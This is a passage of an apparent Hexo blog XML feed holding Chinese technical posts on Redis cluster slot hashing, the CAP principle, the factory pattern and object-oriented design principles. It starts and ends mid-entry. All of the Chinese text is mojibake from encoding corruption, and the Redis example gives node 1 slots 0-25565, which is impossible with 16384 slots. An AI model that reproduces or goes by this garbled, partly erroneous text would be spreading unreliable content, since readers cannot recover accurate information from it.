ä¸ºå•æœºçš„å†…å­˜å®¹é‡æœ€å¤§å°±é‚£ä¹ˆå¤šï¼Œå·²ç»æ²¡åŠæ³•å†ç»§ç»­æ‰©å±•äº†ï¼Œä½†æ˜¯ç°åœ¨åˆéœ€è¦å­˜å‚¨æ›´å¤šçš„å†…å®¹ï¼Œè¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥è®©Nå°æœºå™¨ä¸Šçš„Redisæ¥åˆ†åˆ«å­˜å‚¨å„ä¸ªéƒ¨åˆ†çš„æ•°æ®ï¼ˆæ¯ä¸ªRediså¯ä»¥å­˜å‚¨1/Nçš„æ•°æ®é‡ï¼‰ï¼Œè¿™æ ·å°±å®ç°äº†å®¹é‡çš„æ¨ªå‘æ‰©å±•ã€‚åŒæ—¶æ¯å°Redisè¿˜å¯ä»¥é…ä¸€ä¸ªä»èŠ‚ç‚¹ï¼Œè¿™æ ·å°±å¯ä»¥æ›´å¥½åœ°ä¿è¯æ•°æ®çš„å®‰å…¨æ€§ã€‚</p><p><img src="https://pb01.s3.bitiful.net/6.png" alt="avatar"></p><h4 id="é›†ç¾¤çš„ä½œç”¨"><a href="#é›†ç¾¤çš„ä½œç”¨" class="headerlink" title="é›†ç¾¤çš„ä½œç”¨"></a>é›†ç¾¤çš„ä½œç”¨</h4><ul><li><p><strong>æ•°æ®åˆ†åŒº</strong>ï¼šæ•°æ®åˆ†åŒº(æˆ–ç§°æ•°æ®åˆ†ç‰‡)æ˜¯é›†ç¾¤æœ€æ ¸å¿ƒçš„åŠŸèƒ½ã€‚</p><ul><li>é›†ç¾¤å°†æ•°æ®åˆ†æ•£åˆ°å¤šä¸ªèŠ‚ç‚¹ï¼Œä¸€æ–¹é¢çªç ´äº†Rediså•æœºå†…å­˜å¤§å°çš„é™åˆ¶ï¼Œå­˜å‚¨å®¹é‡å¤§å¤§å¢åŠ ï¼›å¦ä¸€æ–¹é¢æ¯ä¸ªä¸»èŠ‚ç‚¹éƒ½å¯ä»¥å¯¹å¤–æä¾›è¯»æœåŠ¡å’Œå†™æœåŠ¡ï¼Œå¤§å¤§æé«˜äº†é›†ç¾¤çš„å“åº”èƒ½åŠ›ã€‚</li><li>Rediså•æœºå†…å­˜å¤§å°å—é™é—®é¢˜ï¼Œåœ¨ä»‹ç»ä¸»ä»å¤åˆ¶æ—¶æœ‰æåŠï¼›ä¾‹å¦‚ï¼Œå¦‚æœå•æœºå†…å­˜å¤ªå¤§ï¼Œbgsaveå’Œbgrewriteaofçš„forkæ“ä½œå¯èƒ½å¯¼è‡´ä¸»è¿›ç¨‹é˜»å¡ï¼Œä¸»ä»ç¯å¢ƒä¸‹ä¸»æœºåˆ‡æ¢æ—¶å¯èƒ½å¯¼è‡´ä»èŠ‚ç‚¹é•¿æ—¶é—´æ— æ³•æä¾›æœåŠ¡ï¼Œå…¨é‡å¤åˆ¶é˜¶æ®µä¸»èŠ‚ç‚¹çš„å¤åˆ¶ç¼“å†²åŒºå¯èƒ½æº¢å‡ºã€‚</li></ul></li><li><p><strong>é«˜å¯ç”¨</strong>ï¼šé›†ç¾¤æ”¯æŒä¸»ä»å¤åˆ¶å’Œä¸»èŠ‚ç‚¹çš„è‡ªåŠ¨æ•…éšœè½¬ç§»ï¼ˆä¸å“¨å…µç±»ä¼¼ï¼‰ï¼›å½“ä»»ä¸€èŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œé›†ç¾¤ä»ç„¶å¯ä»¥å¯¹å¤–æä¾›æœåŠ¡ã€‚</p></li></ul><p>é‚£ä¹ˆé—®é¢˜æ¥ï¼Œç°åœ¨ç”¨æˆ·æ¥äº†ä¸€ä¸ªå†™å…¥çš„è¯·æ±‚ï¼Œæ•°æ®è¯¥å†™åˆ°å“ªä¸ªèŠ‚ç‚¹ä¸Šå‘¢ï¼Ÿæˆ‘ä»¬æ¥ç ”ç©¶ä¸€ä¸‹<strong>é›†ç¾¤çš„æœºåˆ¶</strong>ï¼š</p><p>é¦–å…ˆï¼Œä¸€ä¸ªRedisé›†ç¾¤åŒ…å«16384ä¸ªæ’æ§½ï¼Œé›†ç¾¤ä¸­çš„æ¯ä¸ªRedis å®ä¾‹è´Ÿè´£ç»´æŠ¤ä¸€éƒ¨åˆ†æ’æ§½ä»¥åŠæ’æ§½æ‰€æ˜ å°„çš„é”®å€¼æ•°æ®ï¼Œé‚£ä¹ˆè¿™ä¸ªæ’æ§½æ˜¯ä»€ä¹ˆæ„æ€å‘¢ï¼Ÿ</p><p>å®é™…ä¸Šï¼Œæ’æ§½å°±æ˜¯é”®çš„Hashè®¡ç®—åçš„ä¸€ä¸ªç»“æœï¼Œæ³¨æ„è¿™é‡Œå‡ºç°äº†è®¡ç®—æœºç½‘ç»œä¸­çš„<strong>CRCå¾ªç¯å†—ä½™æ ¡éªŒ</strong>ï¼Œè¿™é‡Œé‡‡ç”¨CRC16ï¼Œèƒ½å¾—åˆ°16ä¸ªbitä½çš„æ•°æ®ï¼Œä¹Ÿå°±æ˜¯è¯´ç®—å‡ºæ¥ä¹‹åç»“æœæ˜¯0-65535ä¹‹é—´ï¼Œå†è¿›è¡Œå–æ¨¡ï¼Œå¾—åˆ°æœ€ç»ˆç»“æœï¼š</p><p><strong>Redis keyçš„è·¯ç”±è®¡ç®—å…¬å¼</strong>ï¼š</p><script type="math/tex; mode=display">slot = CRC16(key)\mod  16384</script><p>ç»“æœçš„å€¼æ˜¯å¤šå°‘ï¼Œå°±åº”è¯¥å­˜æ”¾åˆ°å¯¹åº”ç»´æŠ¤çš„Redisä¸‹ï¼Œæ¯”å¦‚RedisèŠ‚ç‚¹1è´Ÿè´£0-25565çš„æ’æ§½ï¼Œè€Œè¿™æ—¶å®¢æˆ·ç«¯æ’å…¥äº†ä¸€ä¸ªæ–°çš„æ•°æ®a=10ï¼Œaåœ¨Hashè®¡ç®—åç»“æœä¸º666ï¼Œé‚£ä¹ˆaå°±åº”è¯¥å­˜æ”¾åˆ°1å·RedisèŠ‚ç‚¹ä¸­ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ•°æ®åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¾®æœåŠ¡CAPåŸåˆ™</title>
      <link href="/2023/11/12/CAP%E5%8E%9F%E5%88%99/"/>
      <url>/2023/11/12/CAP%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾®æœåŠ¡CAPåŸåˆ™"><a href="#å¾®æœåŠ¡CAPåŸåˆ™" class="headerlink" title="å¾®æœåŠ¡CAPåŸåˆ™"></a>å¾®æœåŠ¡CAPåŸåˆ™</h2><hr><p>CAPåŸåˆ™åˆç§°CAPå®šç†ï¼ŒæŒ‡çš„æ˜¯åœ¨ä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿä¸­ï¼Œå­˜åœ¨<strong>Consistencyï¼ˆä¸€è‡´æ€§ï¼‰ã€Availabilityï¼ˆå¯ç”¨æ€§ï¼‰ã€Partition toleranceï¼ˆåˆ†åŒºå®¹é”™æ€§ï¼‰</strong>ï¼Œä¸‰è€…ä¸å¯åŒæ—¶ä¿è¯ï¼Œæœ€å¤šåªèƒ½ä¿è¯å…¶ä¸­çš„ä¸¤è€…ã€‚</p><ul><li><p>ä¸€è‡´æ€§ï¼ˆCï¼‰ï¼šåœ¨åˆ†å¸ƒå¼ç³»ç»Ÿä¸­çš„æ‰€æœ‰æ•°æ®å¤‡ä»½ï¼Œåœ¨åŒä¸€æ—¶åˆ»éƒ½æ˜¯åŒæ ·çš„å€¼ï¼ˆæ‰€æœ‰çš„èŠ‚ç‚¹æ— è®ºä½•æ—¶è®¿é—®éƒ½èƒ½æ‹¿åˆ°æœ€æ–°çš„å€¼ï¼‰</p></li><li><p>å¯ç”¨æ€§ï¼ˆAï¼‰ï¼šç³»ç»Ÿä¸­éæ•…éšœèŠ‚ç‚¹æ”¶åˆ°çš„æ¯ä¸ªè¯·æ±‚éƒ½å¿…é¡»å¾—åˆ°å“åº”ï¼ˆæ¯”å¦‚æˆ‘ä»¬ä¹‹å‰ä½¿ç”¨çš„æœåŠ¡é™çº§å’Œç†”æ–­ï¼Œå…¶å®å°±æ˜¯ä¸€ç§ç»´æŒå¯ç”¨æ€§çš„æªæ–½ï¼Œè™½ç„¶æœåŠ¡è¿”å›çš„æ˜¯æ²¡æœ‰ä»€ä¹ˆæ„ä¹‰çš„æ•°æ®ï¼Œä½†æ˜¯ä¸è‡³äºç”¨æˆ·çš„è¯·æ±‚ä¼šè¢«æœåŠ¡å™¨å¿½ç•¥ï¼‰</p></li><li><p>åˆ†åŒºå®¹é”™æ€§ï¼ˆPï¼‰ï¼šä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿé‡Œé¢ï¼ŒèŠ‚ç‚¹ä¹‹é—´ç»„æˆçš„ç½‘ç»œæœ¬æ¥åº”è¯¥æ˜¯è¿é€šçš„ï¼Œç„¶è€Œå¯èƒ½å› ä¸ºä¸€äº›æ•…éšœï¼ˆæ¯”å¦‚ç½‘ç»œä¸¢åŒ…ç­‰ï¼Œè¿™æ˜¯å¾ˆéš¾é¿å…çš„ï¼‰ï¼Œä½¿å¾—æœ‰äº›èŠ‚ç‚¹ä¹‹é—´ä¸è¿é€šäº†ï¼Œæ•´ä¸ªç½‘ç»œå°±åˆ†æˆäº†å‡ å—åŒºåŸŸï¼Œæ•°æ®å°±æ•£å¸ƒåœ¨äº†è¿™äº›ä¸è¿é€šçš„åŒºåŸŸä¸­ï¼ˆè¿™æ ·å°±å¯èƒ½å‡ºç°æŸäº›è¢«åˆ†åŒºèŠ‚ç‚¹å­˜æ”¾çš„æ•°æ®è®¿é—®å¤±è´¥ï¼Œæˆ‘ä»¬éœ€è¦æ¥å®¹å¿è¿™äº›ä¸å¯é çš„æƒ…å†µï¼‰</p></li></ul><p>æ€»çš„æ¥è¯´ï¼Œæ•°æ®å­˜æ”¾çš„èŠ‚ç‚¹æ•°è¶Šå¤šï¼Œåˆ†åŒºå®¹é”™æ€§å°±è¶Šé«˜ï¼Œä½†æ˜¯è¦å¤åˆ¶æ›´æ–°çš„æ¬¡æ•°å°±è¶Šå¤šï¼Œä¸€è‡´æ€§å°±è¶Šéš¾ä¿è¯ã€‚åŒæ—¶ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œæ›´æ–°æ‰€æœ‰èŠ‚ç‚¹æ•°æ®æ‰€éœ€è¦çš„æ—¶é—´å°±è¶Šé•¿ï¼Œé‚£ä¹ˆå¯ç”¨æ€§å°±ä¼šé™ä½ã€‚</p><p>æ‰€ä»¥è¯´ï¼Œåªèƒ½å­˜åœ¨ä»¥ä¸‹ä¸‰ç§æ–¹æ¡ˆï¼š</p><h3 id="AC-å¯ç”¨æ€§-ä¸€è‡´æ€§"><a href="#AC-å¯ç”¨æ€§-ä¸€è‡´æ€§" class="headerlink" title="AC å¯ç”¨æ€§+ä¸€è‡´æ€§"></a>AC å¯ç”¨æ€§+ä¸€è‡´æ€§</h3><p>è¦åŒæ—¶ä¿è¯å¯ç”¨æ€§å’Œä¸€è‡´æ€§ï¼Œä»£è¡¨ç€æŸä¸ªèŠ‚ç‚¹æ•°æ®æ›´æ–°ä¹‹åï¼Œéœ€è¦ç«‹å³å°†ç»“æœé€šçŸ¥ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå¹¶ä¸”è¦å°½å¯èƒ½çš„å¿«ï¼Œè¿™æ ·æ‰èƒ½åŠæ—¶å“åº”ä¿è¯å¯ç”¨æ€§ï¼Œè¿™å°±å¯¹ç½‘ç»œçš„ç¨³å®šæ€§è¦æ±‚éå¸¸é«˜ï¼Œä½†æ˜¯å®é™…æƒ…å†µä¸‹ï¼Œç½‘ç»œå¾ˆå®¹æ˜“å‡ºç°ä¸¢åŒ…ç­‰æƒ…å†µï¼Œå¹¶ä¸æ˜¯ä¸€ä¸ªå¯é çš„ä¼ è¾“ï¼Œå¦‚æœéœ€è¦é¿å…è¿™ç§é—®é¢˜ï¼Œå°±åªèƒ½å°†èŠ‚ç‚¹å…¨éƒ¨æ”¾åœ¨ä¸€èµ·ï¼Œä½†æ˜¯è¿™æ˜¾ç„¶è¿èƒŒäº†åˆ†å¸ƒå¼ç³»ç»Ÿçš„æ¦‚å¿µï¼Œæ‰€ä»¥å¯¹äºæˆ‘ä»¬çš„åˆ†å¸ƒå¼ç³»ç»Ÿæ¥è¯´ï¼Œå¾ˆéš¾æ¥å—ã€‚</p><h3 id="CP-ä¸€è‡´æ€§-åˆ†åŒºå®¹é”™æ€§"><a href="#CP-ä¸€è‡´æ€§-åˆ†åŒºå®¹é”™æ€§" class="headerlink" title="CP ä¸€è‡´æ€§+åˆ†åŒºå®¹é”™æ€§"></a>CP ä¸€è‡´æ€§+åˆ†åŒºå®¹é”™æ€§</h3><p>ä¸ºäº†ä¿è¯ä¸€è‡´æ€§ï¼Œé‚£ä¹ˆå°±å¾—å°†æŸä¸ªèŠ‚ç‚¹çš„æœ€æ–°æ•°æ®å‘é€ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå¹¶ä¸”éœ€è¦ç­‰åˆ°æ‰€æœ‰èŠ‚ç‚¹éƒ½å¾—åˆ°æ•°æ®æ‰èƒ½è¿›è¡Œå“åº”ï¼ŒåŒæ—¶æœ‰äº†åˆ†åŒºå®¹é”™æ€§ï¼Œé‚£ä¹ˆä»£è¡¨æˆ‘ä»¬å¯ä»¥å®¹å¿ç½‘ç»œçš„ä¸å¯é é—®é¢˜ï¼Œæ‰€ä»¥å°±ç®—ç½‘ç»œå‡ºç°å¡é¡¿ï¼Œé‚£ä¹ˆä¹Ÿå¿…é¡»ç­‰å¾…æ‰€æœ‰èŠ‚ç‚¹å®Œæˆæ•°æ®åŒæ­¥ï¼Œæ‰èƒ½è¿›è¡Œå“åº”ï¼Œå› æ­¤å°±ä¼šå¯¼è‡´æœåŠ¡åœ¨ä¸€æ®µæ—¶é—´å†…å®Œå…¨å¤±æ•ˆï¼Œæ‰€ä»¥å¯ç”¨æ€§æ˜¯æ— æ³•å¾—åˆ°ä¿è¯çš„ã€‚</p><h3 id="AP-å¯ç”¨æ€§-åˆ†åŒºå®¹é”™æ€§"><a href="#AP-å¯ç”¨æ€§-åˆ†åŒºå®¹é”™æ€§" class="headerlink" title="AP å¯ç”¨æ€§+åˆ†åŒºå®¹é”™æ€§"></a>AP å¯ç”¨æ€§+åˆ†åŒºå®¹é”™æ€§</h3><p>æ—¢ç„¶CPå¯èƒ½ä¼šå¯¼è‡´ä¸€æ®µæ—¶é—´å†…æœåŠ¡å¾—ä¸åˆ°ä»»ä½•å“åº”ï¼Œé‚£ä¹ˆè¦ä¿è¯å¯ç”¨æ€§ï¼Œå°±åªèƒ½æ”¾å¼ƒèŠ‚ç‚¹ä¹‹é—´æ•°æ®çš„é«˜åº¦ç»Ÿä¸€ï¼Œä¹Ÿå°±æ˜¯è¯´å¯ä»¥åœ¨æ•°æ®ä¸ç»Ÿä¸€çš„æƒ…å†µä¸‹ï¼Œè¿›è¡Œå“åº”ï¼Œå› æ­¤å°±æ— æ³•ä¿è¯ä¸€è‡´æ€§äº†ã€‚è™½ç„¶è¿™æ ·ä¼šå¯¼è‡´æ‹¿ä¸åˆ°æœ€æ–°çš„æ•°æ®ï¼Œä½†æ˜¯åªè¦æ•°æ®åŒæ­¥æ“ä½œåœ¨åå°ç»§ç»­è¿è¡Œï¼Œä¸€å®šèƒ½å¤Ÿåœ¨æŸä¸€æ—¶åˆ»å®Œæˆæ‰€æœ‰èŠ‚ç‚¹æ•°æ®çš„åŒæ­¥ï¼Œé‚£ä¹ˆå°±èƒ½å®ç°æœ€ç»ˆä¸€è‡´æ€§ï¼Œæ‰€ä»¥APå®é™…ä¸Šæ˜¯æœ€èƒ½æ¥å—çš„ä¸€ç§æ–¹æ¡ˆã€‚</p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>å·¥å‚æ¨¡å¼</title>
      <link href="/2023/11/06/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/"/>
      <url>/2023/11/06/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F/</url>
      
        <content type="html"><![CDATA[<h2 id="å·¥å‚æ¨¡å¼"><a href="#å·¥å‚æ¨¡å¼" class="headerlink" title="å·¥å‚æ¨¡å¼"></a>å·¥å‚æ¨¡å¼</h2><p><img src="https://pb01.s3.bitiful.net/1.png" alt="avatar"></p><p>å·¥å‚æ¨¡å¼ä¸»è¦å¯åˆ†ä¸ºä¸‰ç§:ç®€å•å·¥å‚,å·¥å‚æ–¹æ³•,æŠ½è±¡å·¥å‚</p><h3 id="ç®€å•å·¥å‚"><a href="#ç®€å•å·¥å‚" class="headerlink" title="ç®€å•å·¥å‚"></a>ç®€å•å·¥å‚</h3><p><strong>æä¾›å®ç°æ–¹æ³•çš„å·¥å‚</strong></p><p>ç®€å•å·¥å‚ä¸»è¦æœ‰ä½¿ç”¨å·¥å‚çš„å¯¹è±¡,å·¥å‚,å…·ä½“å®ç°ç±»ä»¥åŠä»å®ç°ç±»ä¸­æŠ½è±¡å‡ºçš„æ¥å£,å¦‚ä¸‹å›¾:</p><p><img src="https://pb01.s3.bitiful.net/2.png" alt="avatar"></p><p>ç®€å•å·¥å‚çš„<strong>é—®é¢˜</strong>åœ¨äºå½“å…·ä½“å®ç°ç±»çš„å¢åŠ ,å·¥å‚çš„ä»£ç ä¹Ÿå¾—ä¸æ–­ä¿®æ”¹(å¢åŠ ),è¿åäº†å¼€é—­åŸåˆ™(OOP)</p><h3 id="å·¥å‚æ–¹æ³•"><a href="#å·¥å‚æ–¹æ³•" class="headerlink" title="å·¥å‚æ–¹æ³•"></a>å·¥å‚æ–¹æ³•</h3><p><strong>æä¾›å·¥å‚çš„æ–¹æ³•</strong></p><p>å…·ä½“æ¥è¯´æœ‰:å·¥å‚æ¥å£,äº§å“æ¥å£,äº§å“å®ç°ç±»,å·¥å‚å®ç°ç±»,ä½¿ç”¨ç±»</p><ul><li>æ¯ç±»äº§å“éƒ½æœ‰è‡ªå·±çš„å·¥å‚,ç¬¦åˆå•ä¸€èŒè´£åŸåˆ™;</li><li>è¿™ç±»äº§å“å˜åŒ–åªæ”¹å˜è¿™ç±»äº§å“çš„å·¥å‚,æ›´ç¬¦åˆå¼€é—­åŸåˆ™</li></ul><p>ä½†å·¥å‚æ–¹æ³•ä¹Ÿæœ‰è‡ªå·±çš„é—®é¢˜,å°±æ˜¯æ¯å½“æ–°å¢ä¸€ç±»äº§å“æ—¶,å°±å¾—å¤šå¢åŠ ä¸€ä¸ªå·¥å‚,å½“äº§å“ç§ç±»éå¸¸å¤šæ—¶,å°±ä¼šæœ‰éå¸¸å¤šçš„å·¥å‚,è¿™ä¼šå¯¼è‡´ä»£ç å˜å¾—å¤æ‚å’Œéš¾ä»¥ç»´æŠ¤.</p><h3 id="æŠ½è±¡å·¥å‚"><a href="#æŠ½è±¡å·¥å‚" class="headerlink" title="æŠ½è±¡å·¥å‚"></a>æŠ½è±¡å·¥å‚</h3><p><strong>æä¾›ç»„åˆå·¥å‚çš„æ–¹æ³•</strong></p><p>å…·ä½“æ¥è¯´æœ‰:æŠ½è±¡å·¥å‚æ¥å£,å·¥å‚,äº§å“æ¥å£,äº§å“å®ç°</p><p>ä¸¾ä¸ªä¾‹å­,æˆ‘è¦ä»£å·¥ç”Ÿäº§çš„äº§å“æœ‰æ‰‹æœº,ç”µè„‘,è·¯ç”±å™¨â€¦ç­‰äº§å“,è¿™äº›äº§å“çš„åˆ¶é€ æ–¹æ³•åœ¨æŠ½è±¡å·¥å‚æ¥å£è¢«å®šä¹‰,æ ¹æ®å…·ä½“çš„å“ç‰Œåˆ†åˆ«åˆ›å»ºä¸åŒå“ç‰Œçš„å·¥å‚,åƒå°ç±³å·¥å‚,åä¸ºå·¥å‚,vivoå·¥å‚ç­‰,äº§å“çš„åˆ¶é€ æ–¹æ³•åœ¨å…·ä½“å“ç‰Œçš„å·¥å‚å®ç°,è¿™äº›äº§å“å®ç°ä¹Ÿå®ç°äº†å…·ä½“çš„äº§å“æ¥å£,åä¸ºæ‰‹æœºå®ç°æ‰‹æœºæ¥å£,åˆ¶é€ åä¸ºæ‰‹æœºçš„æ–¹æ³•è¿”å›åä¸ºæ‰‹æœº,å®ç°åˆ¶é€ æ‰‹æœºæ¥å£,æ¯ç§äº§å“éƒ½æ˜¯å¦‚æ­¤.</p><p>ä¼˜ç‚¹ï¼š</p><ul><li>å¯ä»¥ç¡®ä¿åŒä¸€å·¥å‚ç”Ÿæˆçš„äº§å“ç›¸äº’åŒ¹é….</li><li>å¯ä»¥é¿å…å®¢æˆ·ç«¯å’Œå…·ä½“äº§å“ä»£ç çš„è€¦åˆ.</li><li>å•ä¸€èŒè´£åŸåˆ™:å¯ä»¥å°†äº§å“ç”Ÿæˆä»£ç æŠ½å–åˆ°åŒä¸€ä½ç½®ï¼Œ ä½¿å¾—ä»£ç æ˜“äºç»´æŠ¤ã€‚</li><li>å¼€é—­åŸåˆ™:å‘åº”ç”¨ç¨‹åºä¸­å¼•å…¥æ–°äº§å“å˜ä½“æ—¶ï¼Œ æ— éœ€ä¿®æ”¹å®¢æˆ·ç«¯ä»£ç </li></ul><p>ç¼ºç‚¹:</p><ul><li>å…¨æ–°å“ç±»äº§å“éš¾ä»¥æ‰©å±•:æœ¬æ¥åªå‡†å¤‡ç”Ÿäº§æ‰‹æœº,ç”µè„‘,è·¯ç”±å™¨,ç°åœ¨åˆè¦æ·»åŠ æ‰‹è¡¨è¿™ç±»äº§å“,ä»æŠ½è±¡å·¥å‚å¼€å§‹çš„æ‰€æœ‰å¾€åº•å±‚æ‰€æœ‰ä»£ç éƒ½è¦ä¿®æ”¹.</li></ul>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è®¾è®¡æ¨¡å¼ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¢å‘å¯¹è±¡å…­å¤§è®¾è®¡åŸåˆ™</title>
      <link href="/2023/11/04/%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1%E5%85%AD%E5%A4%A7%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/"/>
      <url>/2023/11/04/%E9%9D%A2%E7%9B%B8%E5%AF%B9%E8%B1%A1%E5%85%AD%E5%A4%A7%E8%AE%BE%E8%AE%A1%E5%8E%9F%E5%88%99/</url>
      
        <content type="html"><![CDATA[<h2 id="é¢å‘å¯¹è±¡å…­å¤§è®¾è®¡åŸåˆ™"><a href="#é¢å‘å¯¹è±¡å…­å¤§è®¾è®¡åŸåˆ™" class="headerlink" title="é¢å‘å¯¹è±¡å…­å¤§è®¾è®¡åŸåˆ™"></a>é¢å‘å¯¹è±¡å…­å¤§è®¾è®¡åŸåˆ™</h2><hr><h4 id="å•ä¸€èŒè´£åŸåˆ™-Single-Responsibility-Principle"><a href="#å•ä¸€èŒè´£åŸåˆ™-Single-Responsibility-Principle" class="headerlink" title="å•ä¸€èŒè´£åŸåˆ™(Single Responsibility Principle)"></a>å•ä¸€èŒè´£åŸåˆ™(Single Responsibility Principle)</h4><p>ä¸»è¦æŒ‡çš„æ˜¯ä¸€ä¸ªç±»,æ–¹æ³•,æ¥å£ä¸­åªå®ç°å•ä¸€èŒè´£,è¿™æ ·èƒ½å¤Ÿæå‡ä»£ç å¯è¯»æ€§,å¯ç»´æŠ¤æ€§ä¹Ÿå¤§å¤§æé«˜,æœ‰æ•ˆé¿å…äº†å±å±±ä»£ç çš„å‡ºç°(<strong>ç¡®ä¿¡</strong>),è¿›è¡ŒåŠŸèƒ½å˜æ›´æ—¶çš„é£é™©ä¹Ÿä¼šé™ä½.</p><h4 id="å¼€é—­åŸåˆ™-Open-Closed-Principle"><a href="#å¼€é—­åŸåˆ™-Open-Closed-Principle" class="headerlink" title="å¼€é—­åŸåˆ™(Open Closed Principle)"></a>å¼€é—­åŸåˆ™(Open Closed Principle)</h4><p><strong>å¯¹äºæ‰©å±•å¼€æ”¾,å¯¹äºä¿®æ”¹å°é—­.</strong></p><p>ä¸€ä¸ªè½¯ä»¶å®ä½“åº”è¯¥é€šè¿‡æ‰©å±•æ¥å®ç°å˜åŒ–,è€Œä¸æ˜¯é€šè¿‡ä¿®æ”¹å·²æœ‰çš„ä»£ç å®ç°å˜åŒ–.è¿™æ˜¯ä¸ºè½¯ä»¶å®ä½“çš„æœªæ¥äº‹ä»¶è€Œåˆ¶å®šçš„å¯¹ç°è¡Œå¼€å‘è®¾è®¡è¿›è¡Œçº¦æŸçš„ä¸€ä¸ªåŸåˆ™.</p><p>æ¯”å¦‚ä¸€ä¸ªç±»å¯èƒ½æœ‰å¤šæ–¹éœ€è¦è°ƒç”¨,æœ‰æ—¶éƒ¨åˆ†è°ƒç”¨æ–¹æœ‰äº†æ–°çš„éœ€æ±‚,è¿™æ—¶ä¸èƒ½ç›´æ¥ä¿®æ”¹ç±»çš„ä»£ç æ¥æ›´æ”¹åŠŸèƒ½,è€Œæ˜¯éœ€æ±‚æ–¹å°†è¿™ä¸ªç±»ç»§æ‰¿è¿‡å»å†è¿›è¡Œæ·»åŠ ,ä¿®æ”¹åŠŸèƒ½,è¿™æ ·å‡ºé—®é¢˜ä¸ä¼šå½±å“å…¶ä»–è°ƒç”¨æ–¹,çœŸæ­£åšåˆ°é«˜å†…èš,ä½è€¦åˆ.</p><p>å…¶å®ç±»çš„ä¾‹å­è¿˜ä¸å¤Ÿå‡†ç¡®,ä¸€èˆ¬éƒ½æ˜¯å…ˆå°†èŒè´£æ–¹æ³•æŠ½è±¡æˆæ¥å£,ç„¶åå†æ ¹æ®å„è‡ªéœ€æ±‚çš„ä¸åŒè¿›è¡Œå…·ä½“å®ç°.</p><h4 id="é‡Œå¼æ›¿æ¢åŸåˆ™-Liskov-Substitution-Principle"><a href="#é‡Œå¼æ›¿æ¢åŸåˆ™-Liskov-Substitution-Principle" class="headerlink" title="é‡Œå¼æ›¿æ¢åŸåˆ™(Liskov Substitution Principle)"></a>é‡Œå¼æ›¿æ¢åŸåˆ™(Liskov Substitution Principle)</h4><p><strong>æ‰€æœ‰å¼•ç”¨åŸºç±»çš„åœ°æ–¹å¿…é¡»èƒ½å¤Ÿé€æ˜åœ°ä½¿ç”¨å…¶å­ç±»çš„å¯¹è±¡.</strong></p><p>é€šä¿—ç‚¹è¯´ï¼Œåªè¦çˆ¶ç±»èƒ½å‡ºç°çš„åœ°æ–¹å­ç±»å°±å¯ä»¥å‡ºç°,è€Œä¸”æ›¿æ¢ä¸ºå­ç±»ä¹Ÿä¸ä¼šäº§ç”Ÿä»»ä½•å¼‚å¸¸.ä½†æ˜¯åè¿‡æ¥å°±ä¸è¡Œäº†,å› ä¸ºå­ç±»å¯ä»¥æ‰©å±•çˆ¶ç±»æ²¡æœ‰çš„åŠŸèƒ½,åŒæ—¶å­ç±»è¿˜ä¸èƒ½æ”¹å˜çˆ¶ç±»åŸæœ‰çš„åŠŸèƒ½.</p><p>é‡Œæ°æ›¿æ¢åŸåˆ™ä¸ºè‰¯å¥½çš„ç»§æ‰¿å®šä¹‰äº†ä¸€ä¸ªè§„èŒƒï¼Œå®ƒåŒ…å«äº†4å±‚å«ä¹‰ï¼š</p><p>1ã€å­ç±»å¯ä»¥å®ç°çˆ¶ç±»çš„æŠ½è±¡æ–¹æ³•,ä½†æ˜¯ä¸èƒ½è¦†ç›–çˆ¶ç±»çš„éæŠ½è±¡æ–¹æ³•.</p><p>2ã€å­ç±»å¯ä»¥æœ‰è‡ªå·±çš„ä¸ªæ€§,å¯ä»¥æœ‰è‡ªå·±çš„å±æ€§å’Œæ–¹æ³•.</p><p>3ã€å­ç±»è¦†ç›–æˆ–é‡è½½çˆ¶ç±»çš„æ–¹æ³•æ—¶è¾“å…¥å‚æ•°å¯ä»¥è¢«æ”¾å¤§.</p><p>4ã€å­ç±»è¦†ç›–æˆ–é‡è½½çˆ¶ç±»çš„æ–¹æ³•æ—¶è¾“å‡ºç»“æœå¯ä»¥è¢«ç¼©å°,ä¹Ÿå°±æ˜¯è¯´è¿”å›å€¼è¦å°äºæˆ–ç­‰äºçˆ¶ç±»çš„æ–¹æ³•è¿”å›å€¼.</p><h4 id="è¿ªç±³ç‰¹æ³•åˆ™-Law-of-Demeter"><a href="#è¿ªç±³ç‰¹æ³•åˆ™-Law-of-Demeter" class="headerlink" title="è¿ªç±³ç‰¹æ³•åˆ™(Law of Demeter)"></a>è¿ªç±³ç‰¹æ³•åˆ™(Law of Demeter)</h4><p><strong>ä¸€ä¸ªå¯¹è±¡åº”å°½é‡å‡å°‘å¯¹å…¶ä»–å¯¹è±¡çš„äº†è§£.</strong></p><p>ä¸€ä¸ªç±»åº”è¯¥å¯¹è‡ªå·±éœ€è¦è€¦åˆæˆ–è°ƒç”¨çš„ç±»çŸ¥é“çš„æœ€å°‘,ç±»ä¸ç±»ä¹‹é—´çš„å…³ç³»è¶Šå¯†åˆ‡,è€¦åˆåº¦è¶Šå¤§,é‚£ä¹ˆç±»çš„å˜åŒ–å¯¹å…¶è€¦åˆçš„ç±»çš„å½±å“ä¹Ÿä¼šè¶Šå¤§,è¿™ä¹Ÿæ˜¯æˆ‘ä»¬é¢å‘è®¾è®¡çš„æ ¸å¿ƒåŸåˆ™:é«˜å†…èš,ä½è€¦åˆ.</p><h4 id="æ¥å£éš”ç¦»åŸåˆ™-Interface-Segregation-Principle"><a href="#æ¥å£éš”ç¦»åŸåˆ™-Interface-Segregation-Principle" 